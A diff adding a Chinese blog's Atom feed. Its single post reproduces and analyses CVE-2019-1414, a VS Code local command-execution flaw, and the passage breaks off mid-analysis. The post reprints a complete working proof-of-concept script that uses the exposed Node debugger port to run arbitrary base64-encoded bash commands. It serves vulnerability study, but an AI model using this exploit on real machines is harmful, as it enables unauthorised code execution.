@@ -1,0 +1,567 @@
+<?xml version="1.0" encoding="utf-8"?>
+
+
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
+    <title type="text">b1tg blog</title>
+    <subtitle type="html">MemE 是一个强大且可高度定制的 GoHugo 博客主题，专为个人博客设计。</subtitle>
+    <updated>2019-11-16T22:47:51+08:00</updated>
+    <id>https://b1tg.github.io/</id>
+    <link rel="alternate" type="text/html" href="https://b1tg.github.io/" />
+    <link rel="self" type="application/atom+xml" href="https://b1tg.github.io/atom.xml" />
+    <author>
+            <name>b1tg</name>
+            <uri>https://b1tg.github.io/</uri>
+            </author>
+    <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights>
+    <generator uri="https://gohugo.io/" version="0.59.1">Hugo</generator>
+        <entry>
+            <title type="text">Visual Studio Code本地代码执行漏洞</title>
+            <link rel="alternate" type="text/html" href="https://b1tg.github.io/posts/vscode-local-execute/" />
+            <id>https://b1tg.github.io/posts/vscode-local-execute/</id>
+            <updated>2019-11-16T20:28:19+08:00</updated>
+            <published>2019-11-05T12:54:02+08:00</published>
+            <author>
+                    <name>b1tg</name>
+                    <uri>https://b1tg.github.io</uri>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html"><![CDATA[CVE-2019-1414漏洞复现与分析]]></summary>
+            
+                <content type="html"><![CDATA[
+
+<h1 id="背景">背景</h1>
+
+<p>​微软在2015年推出的跨平台开源编辑器Visual Studio Code（VS Code），凭借其开箱即用的便捷以及丰富的插件社区，迅速吸引了大批用户。在最新的PYPL IDE排行榜中，VS Code已位列第六，并且仍处于上升趋势。</p>
+
+<p>​几个月前，国外安全研究员<a href="https://twitter.com/taviso" target="_blank">Tavis Ormandy</a>发现并提交了VS Code中的一个本地命令执行漏洞(CVE-2019-1414)，并于最近披露。1.39之前版本的vscode受此漏洞影响。</p>
+
+<h1 id="漏洞分析与复现">漏洞分析与复现</h1>
+
+<p>可以在<a href="https://code.visualstudio.com/updates/v1_38" target="_blank">这里</a>找到老版本的vscode安装包，各个操作系统版本的都有，我们这里使用1.38 Mac版本进行演示。</p>
+
+<p>打开下载的vscode。通过ps可以看到，vscode默认开启了一个nodejs调试端口(<code>--inspect=13611</code>)。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ ps aux <span class="p">|</span>grep inspect
+ch               <span class="m">95536</span>   <span class="m">0</span>.0  <span class="m">0</span>.7  <span class="m">4815292</span>  <span class="m">56884</span>   ??  S     <span class="m">9</span>:59上午   <span class="m">0</span>:03.49 /private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper --nolazy --inspect<span class="o">=</span><span class="m">13611</span> /private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Resources/app/out/bootstrap-fork --type<span class="o">=</span>extensionHost
+ch               <span class="m">95748</span>   <span class="m">0</span>.0  <span class="m">0</span>.0  <span class="m">4286472</span>    <span class="m">840</span> s003  S+   <span class="m">10</span>:42上午   <span class="m">0</span>:00.01 grep --color<span class="o">=</span>auto --exclude-dir<span class="o">=</span>.bzr --exclude-dir<span class="o">=</span>CVS --exclude-dir<span class="o">=</span>.git --exclude-dir<span class="o">=</span>.hg --exclude-dir<span class="o">=</span>.svn inspect</code></pre></td></tr></table>
+</div>
+</div>
+<p>我们可以通过api查看以下信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">$ curl http://127.0.0.1:13611/json
+<span class="o">[</span> <span class="o">{</span>
+  <span class="s2">&#34;description&#34;</span>: <span class="s2">&#34;node.js instance&#34;</span>,
+  <span class="s2">&#34;devtoolsFrontendUrl&#34;</span>: <span class="s2">&#34;chrome-devtools://devtools/bundled/js_app.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>,
+  <span class="s2">&#34;devtoolsFrontendUrlCompat&#34;</span>: <span class="s2">&#34;chrome-devtools://devtools/bundled/inspector.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>,
+  <span class="s2">&#34;faviconUrl&#34;</span>: <span class="s2">&#34;https://nodejs.org/static/favicon.ico&#34;</span>,
+  <span class="s2">&#34;id&#34;</span>: <span class="s2">&#34;09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>,
+  <span class="s2">&#34;title&#34;</span>: <span class="s2">&#34;/private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper[95536]&#34;</span>,
+  <span class="s2">&#34;type&#34;</span>: <span class="s2">&#34;node&#34;</span>,
+  <span class="s2">&#34;url&#34;</span>: <span class="s2">&#34;file://&#34;</span>,
+  <span class="s2">&#34;webSocketDebuggerUrl&#34;</span>: <span class="s2">&#34;ws://127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>
+<span class="o">}</span> <span class="o">]</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>在chrome中直接打开这里<code>devtoolsFrontendUrl</code>指向的链接，就可以得到一个调试终端，可以在里面执行js指令。</p>
+
+<p><img src="/img/vscode-local-execute/image-20191105125403677.png" alt="image-20191105125403677" /></p>
+
+<p>漏洞作者给出的poc如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="c1">//poc.js
+</span><span class="c1"></span><span class="kr">const</span> <span class="nx">fetch</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;node-fetch&#39;</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">WebSocket</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;ws&#39;</span><span class="p">)</span>
+
+<span class="kd">function</span> <span class="nx">die</span> <span class="p">(</span><span class="nx">reason</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">reason</span><span class="p">)</span>
+  <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">.</span><span class="nx">length</span> <span class="o">!==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">die</span><span class="p">(</span><span class="s1">&#39;usage: node index.js &lt;IP&gt; &lt;PORT&gt; &lt;COMMAND&gt;&#39;</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="kr">const</span> <span class="nx">IP</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="kr">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+<span class="kr">const</span> <span class="nx">COMMAND</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+<span class="kr">const</span> <span class="nx">COMMAND_B64</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">(</span><span class="nx">COMMAND</span><span class="p">)</span>
+
+<span class="kd">function</span> <span class="nx">base64</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="nx">async</span> <span class="kd">function</span> <span class="nx">getWsLink</span> <span class="p">()</span> <span class="p">{</span>
+  <span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://</span><span class="si">${</span><span class="nx">IP</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">/json`</span><span class="p">)</span>
+  <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">()</span>
+  <span class="k">return</span> <span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">webSocketDebuggerUrl</span>
+<span class="p">}</span>
+
+<span class="nx">async</span> <span class="kd">function</span> <span class="nx">main</span> <span class="p">()</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[?] Getting webSocketDebuggerUrl from http://</span><span class="si">${</span><span class="nx">IP</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">/json`</span><span class="p">)</span>
+  <span class="kr">const</span> <span class="nx">wsLink</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">getWsLink</span><span class="p">().</span><span class="k">catch</span><span class="p">(</span><span class="nx">die</span><span class="p">)</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[!] Found webSocketDebuggerUrl: </span><span class="si">${</span><span class="nx">wsLink</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+  <span class="kr">const</span> <span class="nx">socket</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="nx">wsLink</span><span class="p">)</span>
+
+  <span class="nx">socket</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="nx">async</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[?] Connection established to </span><span class="si">${</span><span class="nx">wsLink</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span> <span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.enable&#39;</span> <span class="p">}))</span>
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+      <span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
+      <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.evaluate&#39;</span><span class="p">,</span>
+      <span class="nx">params</span><span class="o">:</span> <span class="p">{</span>
+        <span class="nx">expression</span><span class="o">:</span> <span class="sb">`spawn_sync = process.binding(&#39;spawn_sync&#39;); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&amp;&amp;(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(&#39; &#39;);typeof a.shell===&#39;string&#39;?c=a.shell:c=&#39;/bin/sh&#39;,b=[&#39;-c&#39;,g];}typeof a.argv0===&#39;string&#39;?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+&#39;=&#39;+d[f]);return{file:c,args:b,options:a,envPairs:e};}`</span>
+      <span class="p">}</span>
+    <span class="p">}))</span>
+
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+      <span class="nx">id</span><span class="o">:</span> <span class="mi">2</span><span class="p">,</span>
+      <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.evaluate&#39;</span><span class="p">,</span>
+      <span class="nx">params</span><span class="o">:</span> <span class="p">{</span>
+        <span class="nx">expression</span><span class="o">:</span> <span class="sb">`spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:&#39;pipe&#39;,readable:!0,writable:!1},{type:&#39;pipe&#39;,readable:!1,writable:!0},{type:&#39;pipe&#39;,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c&lt;a.stdio.length;c++){var e=a.stdio[c]&amp;&amp;a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&amp;&amp;a.encoding&amp;&amp;a.encoding!==&#39;buffer&#39;)for(c=0;c&lt;b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&amp;&amp;b.output[1],b.stderr=b.output&amp;&amp;b.output[2],b.error&amp;&amp;(b.error= b.error + &#39;spawnSync &#39;+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}`</span>
+      <span class="p">}</span>
+    <span class="p">}))</span>
+
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[!] Executing: </span><span class="si">${</span><span class="nx">COMMAND</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+      <span class="nx">id</span><span class="o">:</span> <span class="mi">3</span><span class="p">,</span>
+      <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.evaluate&#39;</span><span class="p">,</span>
+      <span class="nx">params</span><span class="o">:</span> <span class="p">{</span>
+        <span class="nx">expression</span><span class="o">:</span> <span class="sb">`spawnSync(&#39;/bin/bash&#39;, [&#39;-c&#39;, &#39;echo </span><span class="si">${</span><span class="nx">COMMAND_B64</span><span class="si">}</span><span class="sb"> | base64 -d | /bin/bash&#39;])`</span>
+      <span class="p">}</span>
+    <span class="p">}))</span>
+
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
+  <span class="p">}</span>
+
+  <span class="nx">socket</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="c1">// console.log(event)
+</span><span class="c1"></span>  <span class="p">}</span>
+
+  <span class="nx">socket</span><span class="p">.</span><span class="nx">onclose</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="c1">// console.log(event)
+</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">wasClean</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[?] Connection closed cleanly&#39;</span><span class="p">)</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[?] Connection died&#39;</span><span class="p">)</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="nx">socket</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">main</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>执行命令是<code>node poc.js [HOST] [PORT] [CMD]</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">node poc.js <span class="m">127</span>.0.0.1 <span class="m">13611</span> <span class="s2">&#34;pwd &gt;/tmp/a&#34;</span>
+cat /tmp/a</code></pre></td></tr></table>
+</div>
+</div>
+<p>我用上面的命令尝试了几次都没有成功往/tmp/a中写入东西，于是开始着手分析poc代码。</p>
+
+<p>getWsLink函数通过<code>http://127.0.0.1:13611/json</code>拿到webSocketDebuggerUrl。之后这个url被用来进行websocket连接。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">async</span> <span class="kd">function</span> <span class="nx">getWsLink</span> <span class="p">()</span> <span class="p">{</span>
+  <span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://</span><span class="si">${</span><span class="nx">IP</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">/json`</span><span class="p">)</span>
+  <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">()</span>
+  <span class="k">return</span> <span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">webSocketDebuggerUrl</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>建立连接之后发送了4个数据包，这种数据包的协议是<code>Chrome DevTools Protocol</code>，大致结构是这样的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="p">{</span>
+	<span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
+  <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;xxx&#39;</span><span class="p">,</span>
+  <span class="nx">params</span><span class="o">:</span> <span class="p">{}</span> <span class="c1">//可选
+</span><span class="c1"></span><span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>这种协议一般用来调试和优化Chromium, Chrome浏览器，查阅文档可以找到poc中使用的两种method。</p>
+
+<p><img src="/img/vscode-local-execute/image-20191105132516575.png" alt="image-20191105132516575" /></p>
+
+<p><img src="/img/vscode-local-execute/image-20191105132915626.png" alt="image-20191105132915626" /></p>
+
+<p>可以看到两种method都在Runtime Domain分类下面，Runtime Domain把Javascript runtime暴露在远程连接中，且副作用持久化。<code>Runtime.enable</code>使能执行环境、<code>Runtime.evaluate</code>用来执行命令。</p>
+
+<p>之后就需要知道发送的这几个expression里面有什么，把几个包中的expression展开、<a href="https://beautifier.io/" target="_blank">美化</a>之后，可以看地更清晰一些：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="c1">// id=2
+</span><span class="c1"></span><span class="nx">spawn_sync</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">binding</span><span class="p">(</span><span class="s1">&#39;spawn_sync&#39;</span><span class="p">);</span>
+
+<span class="nx">normalizeSpawnArguments</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">a</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//解析参数，c:process, b:args, a:options
+</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="o">?</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">b</span> <span class="o">=</span> <span class="p">[]),</span> <span class="nx">a</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="p">{}),</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">({},</span> <span class="nx">a</span><span class="p">),</span> <span class="nx">a</span><span class="p">.</span><span class="nx">shell</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kr">const</span> <span class="nx">g</span> <span class="o">=</span> <span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">concat</span><span class="p">(</span><span class="nx">b</span><span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">);</span>
+        <span class="k">typeof</span> <span class="nx">a</span><span class="p">.</span><span class="nx">shell</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span> <span class="o">?</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">shell</span> <span class="o">:</span> <span class="nx">c</span> <span class="o">=</span> <span class="s1">&#39;/bin/sh&#39;</span><span class="p">,</span> <span class="nx">b</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="nx">g</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="k">typeof</span> <span class="nx">a</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span> <span class="o">?</span> <span class="nx">b</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">argv0</span><span class="p">)</span> <span class="o">:</span> <span class="nx">b</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">env</span> <span class="o">||</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">f</span> <span class="k">in</span> <span class="nx">d</span><span class="p">)</span> <span class="nx">e</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">f</span> <span class="o">+</span> <span class="s1">&#39;=&#39;</span> <span class="o">+</span> <span class="nx">d</span><span class="p">[</span><span class="nx">f</span><span class="p">]);</span> <span class="c1">//加入环境变量
+</span><span class="c1"></span>    <span class="k">return</span> <span class="p">{</span>
+        <span class="nx">file</span><span class="o">:</span> <span class="nx">c</span><span class="p">,</span>
+        <span class="nx">args</span><span class="o">:</span> <span class="nx">b</span><span class="p">,</span>
+        <span class="nx">options</span><span class="o">:</span> <span class="nx">a</span><span class="p">,</span>
+        <span class="nx">envPairs</span><span class="o">:</span> <span class="nx">e</span>
+    <span class="p">};</span>
+<span class="p">}</span>
+
+<span class="c1">// id=3
+</span><span class="c1"></span><span class="nx">spawnSync</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="c1">//主函数，用来执行命令
+</span><span class="c1"></span>    <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">normalizeSpawnArguments</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">arguments</span><span class="p">);</span> 
+    <span class="c1">// arguments是函数的参数，https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments
